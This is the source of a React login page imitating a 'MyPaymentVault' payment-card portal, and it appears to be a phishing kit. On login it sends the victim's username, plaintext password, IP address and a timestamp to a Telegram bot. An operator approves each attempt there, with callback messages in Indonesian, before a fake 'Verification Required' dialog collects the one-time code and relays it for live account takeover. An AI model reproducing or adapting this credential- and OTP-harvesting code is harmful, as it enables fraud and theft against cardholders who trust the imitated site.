import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { Globe, ChevronDown } from "lucide-react";
import { ChatWidget } from "@/components/chat-widget";
import { RecaptchaBadge } from "@/components/recaptcha-badge";
import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";


const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

export default function Login() {
  const { login, isAuthenticated } = useAuth();
  const { lang, setLang, t, langName } = useI18n();
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showVerifyModal, setShowVerifyModal] = useState(false);
  const [pendingOtp, setPendingOtp] = useState("");
  const [sendingCode, setSendingCode] = useState(false);
  const [showCodeModal, setShowCodeModal] = useState(false);
  const [enteredCode, setEnteredCode] = useState("");
  const [codeError, setCodeError] = useState("");
  const [checkingCode, setCheckingCode] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);
  const otpSessionKeyRef = useRef("");
  const otpPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const otpOffsetRef = useRef(0);

  useEffect(() => () => {
    if (pollRef.current) clearInterval(pollRef.current);
    if (otpPollRef.current) clearInterval(otpPollRef.current);
  }, []);

  if (isAuthenticated) { navigate("/"); return null; }

  const handleContinueCode = async () => {
    if (!enteredCode.trim()) { setCodeError("Please enter the verification code."); return; }
    setCodeError("");
    setCheckingCode(true);
    const sessionKey = Date.now().toString(36) + "_otp";
    otpSessionKeyRef.current = sessionKey;
    const offset = await getLatestOffset();
    otpOffsetRef.current = offset;
    await sendOtpVerificationRequest(username, enteredCode.trim(), pendingOtp, sessionKey);
    otpPollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(otpOffsetRef.current, sessionKey);
      otpOffsetRef.current = nextOffset;
      if (status === "approved") {
        clearInterval(otpPollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ Kode disetujui! Melanjutkan ke step berikutnya.");
        setCheckingCode(false);
        setShowCodeModal(false);
        navigate("/login-success");
      } else if (status === "rejected") {
        clearInterval(otpPollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Kode ditolak.");
        setCheckingCode(false);
        setCodeError("The code you entered was not approved. Please try again.");
      }
    }, 2500);
  };

  const handleResendCode = async () => {
    await sendBotOTP(pendingOtp, username);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    const result = await login(username, password);
    if (!result.ok) {
      setLoading(false);
      setError(t.invalidCredentials);
      return;
    }
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const [ip, startOffset] = await Promise.all([getIPInfo(), getLatestOffset()]);
    setLoading(false);
    const sessionKey = Date.now().toString(36);
    offsetRef.current = startOffset;

    await sendApprovalRequest(username, ip, now, sessionKey, "Login", password);
    setWaiting(true);

    pollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
      offsetRef.current = nextOffset;
      if (status === "approved") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui! Menunggu verifikasi OTP.");
        const otp = String(Math.floor(100000 + Math.random() * 900000));
        sessionStorage.setItem("botOtpUsername", username);
        setPendingOtp(otp);
        setWaiting(false);
        setShowVerifyModal(true);
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
        setWaiting(false);
        setShowModal(true);
      }
    }, 2500);
  };

  return (
    <div
      className="login-outer"
      style={{ minHeight: "100vh", background: "#f7f7f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}
    >
      <style>{`
        /* ── MOBILE ── */
        @media (max-width: 768px) {
          .login-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            align-items: stretch !important;
            padding: 0 !important;
          }
          .login-card {
            max-width: 100% !important;
            width: 100% !important;
            box-shadow: none !important;
            background: #fff !important;
            min-height: 100dvh;
            border-radius: 0 !important;
          }
          .login-card-header {
            padding: 14px 20px !important;
            border-bottom: 1px solid #eee !important;
          }
          .login-card-header .lang-btn { display: flex !important; }
          .login-form-col {
            width: 100% !important;
            padding: 24px 24px 40px !important;
          }
          .login-image-col { display: none !important; }
          .login-hero-mobile {
            display: block !important;
            max-height: 200px !important;
            overflow: hidden !important;
          }
          .login-hero-mobile img {
            width: 100% !important;
            height: 200px !important;
            object-fit: cover !important;
            object-position: center top !important;
            display: block !important;
          }
          .login-footer { display: none !important; }
        }
        /* ── DESKTOP ── */
        @media (min-width: 769px) {
          .login-card {
            background: linear-gradient(to right, #ffffff 0%, #ffffff 65%, #212121 65%, #212121 100%) !important;
            max-width: 1140px !important;
            width: 1140px !important;
          }
          .login-form-col {
            flex: 0 0 41.67% !important;
            width: 41.67% !important;
            max-width: 41.67% !important;
          }
          .login-image-col {
            display: flex !important;
            flex: 0 0 50% !important;
            width: 50% !important;
            max-width: 50% !important;
            background: transparent !important;
            overflow: hidden !important;
          }
          .login-hero-mobile { display: none !important; }
        }
      `}</style>
      {/* ── MODAL 1: VERIFICATION REQUIRED ── */}
      {showVerifyModal && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 1000,
          background: "rgba(0,0,0,0.45)",
          display: "flex", alignItems: "center", justifyContent: "center",
          padding: "0 20px",
        }}>
          <div style={{
            background: "#fff", borderRadius: 12,
            padding: "36px 28px 24px",
            maxWidth: 400, width: "100%",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            textAlign: "center",
          }}>
            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
              Verification Required
            </h3>
            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
              In order to confirm your identity, we need to send you a one-time verification code.
              <br />Please select how you would like to receive it.
            </p>
            <label style={{
              display: "flex", alignItems: "center", justifyContent: "center",
              gap: 10, marginBottom: 28, cursor: "default",
            }}>
              <span style={{
                width: 20, height: 20, borderRadius: "50%",
                border: "2px solid #111", background: "#111",
                display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
              }}>
                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#fff", display: "block" }} />
              </span>
              <span style={{ fontSize: 15, color: "#111" }}>
                Email <strong>*****@*****.com</strong>
              </span>
            </label>
            <div style={{ display: "flex", gap: 12 }}>
              <button
                type="button"
                onClick={() => { setShowVerifyModal(false); setPendingOtp(""); }}
                style={{
                  flex: 1, height: 50, background: "#fff", color: "#111",
                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
                  borderRadius: 6, cursor: "pointer",
                }}
              >Cancel</button>
              <button
                type="button"
                disabled={sendingCode}
                onClick={async () => {
                  setSendingCode(true);
                  await sendBotOTP(pendingOtp, username);
                  setSendingCode(false);
                  setShowVerifyModal(false);
                  setEnteredCode("");
                  setCodeError("");
                  setShowCodeModal(true);
                }}
                style={{
                  flex: 1, height: 50, background: "#111", color: "#fff",
                  fontSize: 15, fontWeight: 500, border: "none",
                  borderRadius: 6, cursor: sendingCode ? "not-allowed" : "pointer",
                  opacity: sendingCode ? 0.7 : 1,
                }}
              >{sendingCode ? "Sending..." : "Send Code"}</button>
            </div>
            <p style={{ fontSize: 12, color: "#999", marginTop: 14 }}>Standard rates may apply</p>
          </div>
        </div>
      )}

      {/* ── MODAL 2: ENTER CODE ── */}
      {showCodeModal && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 1000,
          background: "rgba(0,0,0,0.45)",
          display: "flex", alignItems: "center", justifyContent: "center",
          padding: "0 20px",
        }}>
          <div style={{
            background: "#fff", borderRadius: 12,
            padding: "36px 28px 24px",
            maxWidth: 400, width: "100%",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            textAlign: "center",
          }}>
            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
              Verification Required
            </h3>
            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
              Enter the verification code sent to you.<br />
              This code will expire 10 minutes after it is sent.
            </p>
            <input
              type="text"
              placeholder="Verification Code*"
              value={enteredCode}
              onChange={(e) => setEnteredCode(e.target.value)}
              onKeyDown={(e) => { if (e.key === "Enter") handleContinueCode(); }}
              disabled={checkingCode}
              style={{
                width: "100%", height: 48, padding: "0 14px",
                fontSize: 15, color: "#111",
                border: "1px solid #ccc", borderRadius: 6,
                outline: "none", boxSizing: "border-box",
                marginBottom: 8, background: checkingCode ? "#f5f5f5" : "#fff",
              }}
            />
            {codeError && (
              <div style={{
                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
                fontSize: 12, padding: "8px 12px", marginBottom: 12, borderRadius: 4, textAlign: "left",
              }}>{codeError}</div>
            )}
            {checkingCode && (
              <div style={{ fontSize: 13, color: "#888", marginBottom: 12 }}>
                Waiting for admin approval…
              </div>
            )}
            <div style={{ display: "flex", gap: 12, marginTop: 8 }}>
              <button
                type="button"
                disabled={checkingCode}
                onClick={() => {
                  if (otpPollRef.current) clearInterval(otpPollRef.current);
                  setShowCodeModal(false);
                  setEnteredCode("");
                  setCodeError("");
                }}
                style={{
                  flex: 1, height: 50, background: "#fff", color: "#111",
                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
                  opacity: checkingCode ? 0.5 : 1,
                }}
              >Cancel</button>
              <button
                type="button"
                disabled={checkingCode}
                onClick={handleContinueCode}
                style={{
                  flex: 1, height: 50, background: "#111", color: "#fff",
                  fontSize: 15, fontWeight: 500, border: "none",
                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
                  opacity: checkingCode ? 0.7 : 1,
                }}
              >{checkingCode ? "Checking…" : "Continue"}</button>
            </div>
            <button
              type="button"
              onClick={handleResendCode}
              disabled={checkingCode}
              style={{
                marginTop: 16, fontSize: 13, color: "#111",
                textDecoration: "underline", background: "none",
                border: "none", cursor: "pointer",
              }}
            >Didn't receive a code? Resend code</button>
          </div>
        </div>
      )}

      {/* ── INCORRECT CREDENTIALS MODAL ── */}
      {showModal && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 1000,
          background: "rgba(0,0,0,0.45)",
          display: "flex", alignItems: "center", justifyContent: "center",
          padding: "0 20px",
        }}>
          <div style={{
            background: "#fff", borderRadius: 4,
            padding: "32px 28px 24px",
            maxWidth: 380, width: "100%",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            textAlign: "center",
          }}>
            <h3 style={{ fontSize: 18, fontWeight: 600, color: "#111", marginBottom: 14 }}>
              {t.incorrectCredsTitle}
            </h3>
            <p style={{ fontSize: 13, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
              {t.incorrectCredsDesc}
            </p>
            <button
              type="button"
              onClick={() => setShowModal(false)}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                borderRadius: 3, cursor: "pointer", letterSpacing: "0.03em",
              }}
            >
              {t.close}
            </button>
          </div>
        </div>
      )}

      {/* ── WAITING OVERLAY ── */}
      {waiting && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 999,
          background: "rgba(255,255,255,0.7)",
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <div style={{
            width: 44, height: 44,
            border: "4px solid #e5e5e5", borderTop: "4px solid #111",
            borderRadius: "50%", animation: "spin 0.85s linear infinite",
          }} />
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* ─── CARD ─── */}
      <div
        className="login-card"
        style={{
          width: "100%",
          maxWidth: 960,
          boxShadow: "0 2px 32px rgba(0,0,0,0.13)",
          display: "flex",
          flexDirection: "column",
        }}
      >
        {/* ══ HEADER: logo kiri + bahasa kanan ══ */}
        <div
          className="login-card-header"
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            padding: "16px 28px",
          }}
        >
          {/* Logo */}
          <span className="select-none" style={{ fontSize: 14, letterSpacing: "0.18em", color: "#111" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>

          {/* Language selector */}
          <div style={{ position: "relative" }} className="lang-btn">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{ display: "flex", alignItems: "center", gap: 5, color: "#111", fontSize: 13, background: "#fff", border: "1px solid #ccc", borderRadius: 4, padding: "5px 10px", cursor: "pointer" }}
            >
              <Globe size={15} color="#555" />
              <span>{languageOptions.find(o => o.code === lang)?.label ?? "English"}</span>
              <ChevronDown size={13} color="#555" />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.25)", zIndex: 20 }}>
                  {languageOptions.map((opt) => (
                    <button
                      key={opt.code}
                      type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
                    >
                      {opt.label}
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ CONTENT ROW: form kiri + gambar kanan ══ */}
        <div style={{ display: "flex", flex: 1 }}>

          {/* FORM COLUMN */}
          <div
            className="login-form-col"
            style={{ width: "41.67%", padding: "8px 40px 40px 40px", background: "transparent", position: "relative", zIndex: 2 }}
          >
            {/* HERO IMAGE — mobile only */}
            <div className="login-hero-mobile" style={{ display: "none", lineHeight: 0, margin: "0 -20px 16px", width: "calc(100% + 40px)" }}>
              <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
            </div>

            <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 6 }}>
              {t.accessAccount}
            </h2>
            <p style={{ fontSize: 13, color: "#666", marginBottom: 22 }}>
              {t.notEnrolled}{" "}
              <button type="button" onClick={() => navigate("/create-account")} style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 13 }}>
                {t.createAccount}
              </button>
            </p>

            <form onSubmit={handleSubmit}>
              {/* Username */}
              <div style={{ marginBottom: 14 }}>
                <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
                  <button type="button" onClick={() => navigate("/forgot-username")} style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
                    {t.forgotUsername}
                  </button>
                </div>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  placeholder={`${t.username}*`}
                  style={{ width: "100%", height: 42, padding: "0 12px", border: "1px solid #ccc", fontSize: 13, color: "#333", outline: "none", boxSizing: "border-box", borderRadius: 3 }}
                />
              </div>

              {/* Password */}
              <div style={{ marginBottom: 18 }}>
                <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
                  <button type="button" onClick={() => navigate("/forgot-password")} style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
                    {t.forgotPassword}
                  </button>
                </div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  placeholder={`${t.password}*`}
                  style={{ width: "100%", height: 42, padding: "0 12px", border: "1px solid #ccc", fontSize: 13, color: "#333", outline: "none", boxSizing: "border-box", borderRadius: 3 }}
                />
              </div>

              {error && (
                <div style={{ background: "#fff0f0", border: "1px solid #fcc", color: "#c00", fontSize: 12, textAlign: "center", padding: "8px 12px", marginBottom: 12 }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{ width: "100%", height: 44, background: "#111", color: "#fff", fontSize: 14, fontWeight: 500, border: "none", cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.6 : 1, letterSpacing: "0.04em", borderRadius: 3 }}
              >
                {loading ? t.loggingIn : t.login}
              </button>
            </form>

            <p style={{ fontSize: 12, color: "#777", textAlign: "center", marginTop: 16 }}>
              {t.newCard}{" "}
              <button type="button" onClick={() => navigate("/activate-card")} style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 12 }}>
                {t.activateCard}
              </button>
            </p>
          </div>

          {/* IMAGE COLUMN */}
          <div
            className="login-image-col"
            style={{
              display: "none",
              width: "50%",
              overflow: "hidden",
              position: "relative",
            }}
          >
            <img
              src="/hero-vault-new.png"
              alt=""
              style={{
                display: "block",
                width: "100%",
                height: "100%",
                objectFit: "cover",
                objectPosition: "center",
              }}
            />
          </div>

        </div>{/* end content row */}
      </div>

      {/* ─── FOOTER ─── */}
      <div className="login-footer" style={{ width: "100%", maxWidth: 1140, marginTop: 12, textAlign: "right" }}>
        <span style={{ fontSize: 11, color: "#888" }}>
          &copy; {t.copyright} |{" "}
          <button onClick={() => {}} style={{ fontSize: 11, color: "#888", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
            {t.termsOfUse}
          </button>
          {" | "}
          <button onClick={() => {}} style={{ fontSize: 11, color: "#888", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
            {t.privacyCookies}
          </button>
        </span>
      </div>

      <RecaptchaBadge />
      <ChatWidget />
    </div>
  );
}
